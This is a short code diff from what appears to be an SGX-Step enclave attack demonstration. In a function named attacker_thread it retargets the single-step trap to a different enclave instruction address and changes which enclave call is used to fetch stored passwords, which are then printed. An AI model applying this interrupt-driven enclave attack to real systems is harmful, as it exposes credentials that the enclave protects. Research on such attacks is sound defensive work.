@@ -71,7 +71,7 @@ void aep_cb_func(void)
     info("^^ enclave RIP=%#llx", erip);
 
     
-    if(erip == 0x33bc){ // logout between line 38 and 39
+    if(erip == 0x33a5){ // logout between line 38 and 39
         info("testreach");
         sgx_step_do_trap = 0;
 
@@ -258,10 +258,7 @@ void* attacker_thread(void* arg) {
             password6, password7, password8, password9, password10}
     };
 
-    for (int i = 0; i < output.array_len; ++i) {
-        printf("Password %d: %s\n", i, output.passwords[i]);
-    }
-    ecall_get_passwords2(eidarg, "dummy", &output);
+    ecall_get_passwords(eidarg, "dummy", &output);
 
     for (int i = 0; i < output.array_len; ++i) {
         printf("Password %d: %s\n", i, output.passwords[i]);
